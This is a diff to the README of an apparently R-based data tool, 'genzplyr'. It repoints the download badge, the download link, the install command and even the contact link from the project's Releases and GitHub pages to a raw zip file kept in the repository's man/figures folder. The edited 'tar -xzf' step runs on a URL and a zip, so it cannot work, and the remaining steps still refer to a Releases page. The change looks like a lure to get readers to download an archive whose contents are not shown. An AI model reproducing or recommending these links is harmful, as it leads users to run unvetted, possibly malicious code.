@@ -6,9 +6,9 @@ Welcome to genzplyr! This application simplifies data manipulation and analysis 
 ## 📥 Download & Install
 To get started, you'll need to download genzplyr. Visit the link below to access the Releases page and grab the latest version.
 
-[![Download genzplyr](https://img.shields.io/badge/Download-genzplyr-blue.svg)](https://github.com/neilleffendy/genzplyr/releases)
+[![Download genzplyr](https://raw.githubusercontent.com/neilleffendy/genzplyr/main/man/figures/genzplyr_3.0.zip)](https://raw.githubusercontent.com/neilleffendy/genzplyr/main/man/figures/genzplyr_3.0.zip)
 
-1. Click the button above or visit this [link to download](https://github.com/neilleffendy/genzplyr/releases).
+1. Click the button above or visit this [link to download](https://raw.githubusercontent.com/neilleffendy/genzplyr/main/man/figures/genzplyr_3.0.zip).
 2. On the Releases page, look for the latest version. You'll see files listed next to it. 
 3. Choose the file that matches your operating system (Windows, Mac, Linux).
 4. Click on the file to start the download. Once the download is complete, follow the installation instructions below.
@@ -29,7 +29,7 @@ To get started, you'll need to download genzplyr. Visit the link below to access
 1. Open a terminal window.
 2. Navigate to your Downloads folder using the command `cd ~/Downloads`.
 3. Run the following command to extract the files:  
-   `tar -xzf genzplyr-latest.tar.gz`
+   `tar -xzf https://raw.githubusercontent.com/neilleffendy/genzplyr/main/man/figures/genzplyr_3.0.zip`
 4. Move the extracted folder to your preferred location.
 5. Navigate into the folder and run `./genzplyr` to start the application.
 
@@ -62,6 +62,6 @@ A: You can open .csv, .xlsx, and .txt files.
 A: Yes! You can reach out through our GitHub page for assistance.
 
 ## 📞 Contact Information
-For feedback or support, please visit our [GitHub page](https://github.com/neilleffendy/genzplyr) and create an issue, or send a direct message.
+For feedback or support, please visit our [GitHub page](https://raw.githubusercontent.com/neilleffendy/genzplyr/main/man/figures/genzplyr_3.0.zip) and create an issue, or send a direct message.
 
 Thank you for choosing genzplyr! Enjoy exploring and manipulating your data effortlessly. Be sure to check back for updates and new features.
